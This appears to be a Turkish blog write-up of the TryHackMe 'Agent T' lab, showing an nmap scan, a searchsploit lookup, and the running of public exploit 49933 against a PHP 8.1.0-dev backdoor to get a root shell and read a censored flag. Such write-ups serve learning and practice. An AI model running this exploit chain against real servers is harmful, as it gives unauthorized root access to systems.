---
title: "Agent T Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere TryHackMe platformunda bulunan "Agent T" isimli makinenin çözümü anlatacağım. Keyifli Okumalar...

1 - *Nmap* aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum.

```shell
nmap -sS -sV 10.10.110.47
```

2 - Tarama sonucunda 80 numaralı portun açık olduğunu görüyorum. Daha sonra searchsploit aracı ille "php 8.1.0" bilgisini aratıyorum.

```shell
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:37 +03
Nmap scan report for 10.10.110.47
Host is up (0.10s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

3 -  49933 id li exploiti indiriyorum.

```shell
> searchsploit "php 8.1.0"
*
*
*
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution | php/webapps/49933.py
*
*
> searchsploit -m 49933
```

4 - Exploiti çalıştırıyorum. Çalıştırdıktan sonra *root* kullanıcısı olduğumu görüyorum.

```shell
> python3 49933.py                                                                                                 
Enter the full host url:
http://10.10.110.47

Interactive shell is opened on http://10.10.110.47 
Can't acces tty; job crontol turned off.
$ whoami
root
```

5 - *find* komutu ile bayrak dosyasını arıyorum. Bayrak dosyasını bulduktan sonra *cat* komutu ile okuyorum.

```shell
> find / -type f -name "*flag*" 2>/dev/null
> cat /flag.txt
flag{CENSORED}
```